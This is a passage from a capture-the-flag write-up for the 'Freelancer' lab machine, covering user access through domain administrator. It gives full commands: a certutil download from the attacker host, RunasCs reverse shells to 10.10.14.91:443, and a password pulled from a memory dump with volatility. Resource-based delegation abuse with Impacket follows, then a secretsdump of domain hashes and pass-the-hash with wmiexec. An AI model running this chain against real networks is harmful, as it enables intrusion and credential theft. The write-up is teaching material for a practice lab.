Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```cmd
C:\Windows\Temp\privesc>certutil.exe -f -urlcache -split http://10.10.14.91/RunasCs.exe RunasCs.exe
```

It works for the user mikasaAckerman and sql_svc:

```bash
C:\Windows\Temp\privesc>.\RunasCs.exe "lkazanof" "IL0v3ErenY3ager" "whoami"
.\RunasCs.exe "lkazanof" "IL0v3ErenY3ager" "whoami"
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
C:\Windows\Temp\privesc>.\RunasCs.exe "lorra199" "IL0v3ErenY3ager" "whoami"
.\RunasCs.exe "lorra199" "IL0v3ErenY3ager" "whoami"
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
C:\Windows\Temp\privesc>.\RunasCs.exe "mikasaAckerman" "IL0v3ErenY3ager" "whoami"
.\RunasCs.exe "mikasaAckerman" "IL0v3ErenY3ager" "whoami"

freelancer\mikasaackerman
```

I will take advantage of RunasCs.exe and give me a reverse shell on port 443:

```bash
❯ rlwrap nc -lvnp 443
```

```bash
C:\Windows\Temp\privesc>.\RunasCs.exe "mikasaAckerman" "IL0v3ErenY3ager" cmd.exe -r 10.10.14.91:443
.\RunasCs.exe "mikasaAckerman" "IL0v3ErenY3ager" cmd.exe -r 10.10.14.91:443

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-4aa81$\Default
[+] Async process 'C:\WINDOWS\system32\cmd.exe' with pid 4500 created in background.
```

And I receive the shell as mikasaAckerman:

![](/assets/images/Freelancer/Pasted%20image%2020241005130648.png)

Flag user.txt is available at mikasa's desktop:

```bash
C:\Users\mikasaAckerman\Desktop>type user.txt
type user.txt
bd****************************10
```
# Access as lorra199

Looking at mikasaAckerman's desktop, I can see two interesting files MEMORY.7z and mail.txt:

```cmd
C:\Users\mikasaAckerman\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8954-28AE

 Directory of C:\Users\mikasaAckerman\Desktop

05/28/2024  10:22 AM    <DIR>          .
05/28/2024  10:22 AM    <DIR>          ..
10/28/2023  06:23 PM             1,468 mail.txt
10/04/2023  01:47 PM       292,692,678 MEMORY.7z
10/05/2024  10:47 AM                34 user.txt
               3 File(s)    292,694,180 bytes
               2 Dir(s)   2,603,200,512 bytes free
```

The `mail.txt` file has a message saying that the server has problems and there is a memory dump generated by him/her:

```cmd
C:\Users\mikasaAckerman\Desktop>type mail.txt
type mail.txt
Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
```

Probably the memory dump is MEMORY.7z so I will transfer it to my machine as it probably has credentials from lsass or something similar because it dumps **all the memory**:

```bash
❯ smbserver.py -smb2support test $(pwd)
```

```cmd
C:\Users\mikasaAckerman\Desktop>net use z: \\10.10.14.91\test /user:test test123
C:\Users\mikasaAckerman\Desktop>copy MEMORY.7z z:
C:\Users\mikasaAckerman\Desktop>net use /delete z:
```

Now that I have the 7z file I will extract it and see it's the .dmp file as I expected:

```bash
❯ 7z x MEMORY.7z
❯ file MEMORY.DMP
MEMORY.DMP: MS Windows 64bit crash dump, version 15.17763, 2 processors, full dump, 4992030524978970960 pages
```

I will use [volatility](https://github.com/volatilityfoundation/volatility3) to extract sensitive info of the crash dump. First, I will install it:

```bash
❯ git clone https://github.com/volatilityfoundation/volatility3
❯ cd volatility3
❯ python3 setup.py install
❯ sudo python3 setup.py install
```

And using [this cheatsheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet#hashes-passwords) I will execute it and try to see secrets stored in lsa:

```plaintext
❯ ./vol.py -f ../MEMORY.DMP windows.lsadump.Lsadump
Volatility 3 Framework 2.10.0
Progress:  100.00		PDB scanning finished                                
Key	Secret	Hex

$MACHINE.ACC	ð¦¤¯0àEdÆõ,=sAúÿY�5Ïõ2
                                      e"
                                        O¨ÉÑî"éÄvk>¶?³âÚgëÑ0Ô\
                                                              ¤ææß

<..SNIP..>
_SC_MSSQL$DATA	*PWN3D#l0rr@Armessa199	2a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 00 57 00 4e 00 33 00 44 00 23 00 6c 00 30 00 72 00 72 00 40 00 41 00 72 00 6d 00 65 00 73 00 73 00 61 00 31 00 39 00 39 00 00 00 00 00 00 00
<..SNIP..>
```

I can see a possible password `PWN3D#l0rr@Armessa199` which works for user lorra199:

```plaintext
❯ netexec smb 10.10.11.5 -u lorra199 -p 'PWN3D#l0rr@Armessa199'
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 
```


I will use runascs.exe to receive another reverse shell as lorra199:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

```powershell
C:\Windows\Temp\privesc>.\RunasCs.exe "lorra199" "PWN3D#l0rr@Armessa199" cmd.exe -r 10.10.14.91:443
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-4aa81$\Default
[+] Async process 'C:\WINDOWS\system32\cmd.exe' with pid 3892 created in background.
```

And I successfully receive it:

![](/assets/images/Freelancer/Pasted%20image%2020241005154133.png)
# Access as Administrator

I will look directly to domain information using bloodhound as this is a domain and I didn't saw nothing interesting in the system. First, I will add dc.freelancer.htb remaining like this:

```bash
❯ tail -n 1 /etc/hosts
10.10.11.5 dc.freelancer.htb freelancer.htb
```

Then, I will sync the clock with victim machine:

```bash
❯ sudo ntpdate 10.10.11.5
2024-10-05 21:03:31.146640 (+0200) +18000.046772 +/- 0.182158 10.10.11.5 s1 no-leap
CLOCK: time stepped by 18000.046772
```

And now I can successfully dump the data:

```bash
❯ /opt/BloodHound.py/bloodhound.py -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' --zip -d freelancer.htb -c All -ns 10.10.11.5
INFO: Found AD domain: freelancer.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.freelancer.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 8 computers
INFO: Connecting to LDAP server: dc.freelancer.htb
INFO: Found 30 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SetupMachine.freelancer.htb
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: Datacenter-2019
INFO: Querying computer: DC.freelancer.htb
WARNING: Could not resolve: Datacenter-2019: All nameservers failed to answer the query Datacenter-2019. IN A: Server Do53:10.10.11.5@53 answered SERVFAIL
INFO: Done in 01M 10S
INFO: Compressing output into 20241005212535_bloodhound.zip
```

Now I will import it in bloodhound to see information of privileges:

```bash
❯ sudo neo4j console
```

```bash
❯ bloodhound &>/dev/null & disown
```

User `lorra199` belongs to `AD Recycle Bin` group:

![](/assets/images/Freelancer/Pasted%20image%2020241005213400.png)

And if I look in "Analysis > Find shortest paths to domain admin", I can see that it has GenericWrite on the DC:

![](/assets/images/Freelancer/Pasted%20image%2020241005213510.png)

So I can create a new computer that delegates to the real computer and be able to get a TGT for Administrator and dump all hashes from the DC:

```bash
❯ addcomputer.py -computer-name 'GABRI-PC$' -computer-pass 'gabri123$!' -dc-host dc.freelancer.htb -domain-netbios freelancer.htb 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account GABRI-PC$ with password gabri123$!.
❯ rbcd.py -delegate-from 'GABRI-PC$' -delegate-to 'DC$' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] GABRI-PC$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     GABRI-PC$    (S-1-5-21-3542429192-2036945976-3483670807-11601)
❯ getST.py -spn 'cifs/dc.freelancer.htb' -impersonate 'Administrator' 'freelancer.htb/GABRI-PC$:gabri123$!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
```

Now I can dump hashes with secretsdump:

```bash
❯ secretsdump.py -dc-ip 10.10.11.5 -k -no-pass dc.freelancer.htb
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'secretsdump.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<..SNIP..>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
```

And execute command in the victim machine using wmiexec:

```bash
❯ wmiexec.py -hashes ':0039318f1e8274633445bce32ad1a290' dc.freelancer.htb/Administrator@10.10.11.5
/usr/local/bin/wmiexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'wmiexec.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
freelancer\administrator
```

And root.txt is available in Administrator's desktop:

```bash
C:\>cd users\administrator
C:\users\administrator>cd Desktop
C:\users\administrator\Desktop>type root.tx
tThe system cannot find the file specified.

C:\users\administrator\Desktop>type root.txt
58****************************a3
```

That's the machine guys. Hope you liked it!

{% endraw %}
